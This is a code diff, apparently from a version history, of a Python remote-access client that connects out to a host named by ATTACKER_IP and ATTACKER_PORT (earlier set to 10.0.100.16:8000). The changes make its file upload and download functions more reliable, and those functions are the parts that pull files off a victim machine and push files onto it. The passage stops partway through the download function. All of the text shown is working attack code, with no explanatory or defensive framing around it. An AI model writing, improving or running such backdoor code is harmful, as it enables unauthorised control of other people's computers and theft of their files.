@@ -2,17 +2,22 @@ import socket
 import subprocess
 import os
 
-ATTACKER_IP = "10.0.100.16"
-ATTACKER_PORT = 8000
+ATTACKER_IP = "ATTACKER_IP"
+ATTACKER_PORT = ATTACKER_PORT
 
 def reliable_send(data, conn):
     conn.send(data.encode('utf-8'))
 
 def reliable_recv(conn):
-    data = conn.recv(1024).decode('utf-8')
+    data = conn.recv(1024).decode('utf-8').strip()
     return data
 
 def upload_file(conn, filename):
+    filename = filename.strip()  # Remove any leading/trailing whitespace
+    if not os.path.isfile(filename):
+        reliable_send("File not found.", conn)
+        return
+
     try:
         with open(filename, 'rb') as f:
             conn.send(b"UPLOAD_READY")
@@ -22,12 +27,11 @@ def upload_file(conn, filename):
                     break
                 conn.send(bits)
             conn.send(b"DONE")
-    except FileNotFoundError:
-        reliable_send("File not found.", conn)
     except Exception as e:
         reliable_send(f"Error: {str(e)}", conn)
 
 def download_file(conn, filename):
+    filename = filename.strip()  # Remove any leading/trailing whitespace
     try:
         with open(filename, 'wb') as f:
             conn.send(b"DOWNLOAD_READY")
